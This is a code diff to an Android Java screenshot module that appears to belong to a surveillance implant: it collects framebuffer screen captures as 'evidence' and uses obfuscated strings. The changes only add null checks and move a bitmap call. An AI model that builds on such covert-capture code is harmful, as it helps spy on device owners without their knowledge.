@@ -147,7 +147,6 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 
 				if (!frameBuffer && !screenCap) {
-
 					if (!infoScreenSent) {
 						EvidenceBuilder.info(M.e("Screenshot not supported")); //$NON-NLS-1$
 						infoScreenSent = true;
@@ -246,8 +245,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		}
 
 		try {
-			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
-					.getDefaultDisplay();
+			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
 
 			int width, height, w, h;
 			final int orientation = display.getOrientation();
@@ -327,14 +325,19 @@ public class ModuleSnapshot extends BaseInstantModule {
 					}
 
 					raw = newraw;
-					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 				}
+				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 
 				ByteBuffer buffer = ByteBuffer.wrap(raw);
 				if (buffer == null) {
 					return false;
 				}
-				
+				if(bitmap == null){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (frameBufferMethod): 1) bitmap creation failed");
+					}
+					return false;
+				}
 				bitmap.copyPixelsFromBuffer(buffer);
 				buffer = null;
 				raw = null;
@@ -360,7 +363,12 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 					bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
 				}
-
+				if(bitmap == null){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (frameBufferMethod): 2) bitmap creation failed");
+					}
+					return false;
+				}
 				byte[] jpeg = toJpeg(bitmap);
 				bitmap = null;
 
